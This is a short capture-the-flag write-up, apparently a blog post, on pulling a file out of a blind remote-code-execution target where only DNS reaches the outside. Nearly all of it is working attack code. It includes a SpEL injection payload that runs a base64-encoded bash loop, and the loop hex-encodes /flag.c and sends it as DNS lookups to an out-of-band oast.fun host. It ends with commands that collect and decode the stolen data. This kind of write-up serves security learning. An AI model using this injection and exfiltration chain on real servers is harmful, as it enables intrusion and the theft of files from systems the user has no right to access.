---
title: "DNS exfil — challenge solution"
date: 2024-05-31
tags: [dns, exfiltration, oast, rce]
summary: "Blind RCE, DNS-only egress."
---

Example from a challenge I solved. Blind RCE, outbound HTTP blocked, DNS resolves — read the file in chunks and send it out as DNS labels.

```bash
for i in $(seq 0 10 $(($(stat -c%s /flag.c)-1))); do a=$(dd if=/flag.c bs=1 skip=$i count=10 2>/dev/null | od -An -tx1 | tr -d ' \n'); wget --timeout=1 --tries=1 $a.nxgjhlviuvwiipnxyeukzy1yq9diq7ri6.oast.fun; done
```

Delivery (SpEL, base64 to dodge quoting):

```
__${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,Zm9yIGkgaW4gJChzZXEgMCAxMCAkKCgkKHN0YXQgLWMlcyAvZmxhZy5jKS0xKSkpOyBkbyBhPSQoZGQgaWY9L2ZsYWcuYyBicz0xIHNraXA9JGkgY291bnQ9MTAgMj4vZGV2L251bGwgfCBvZCAtQW4gLXR4MSB8IHRyIC1kICcgXG4nKTsgd2dldCAtLXRpbWVvdXQ9MSAtLXRyaWVzPTEgJGEubnhnamhsdml1dndpaXBueHlldWt6eTF5cTlkaXE3cmk2Lm9hc3QuZnVuOyBkb25lCg==}|{base64,-d}|{bash,-i}")}__::x
```

Collect and decode:

```bash
cat requests.json | grep -oE '[0-9a-fA-F]+\.nxgjhlviuvwiipnxyeukzy1yq9diq7ri6\.oast\.fun' | uniq
```

```python
import re, binascii
data = """<labels>"""
print(binascii.unhexlify(''.join(re.findall(r'([0-9a-fA-F]+)\.<oast>', data))).decode('utf-8', errors='ignore'))
```
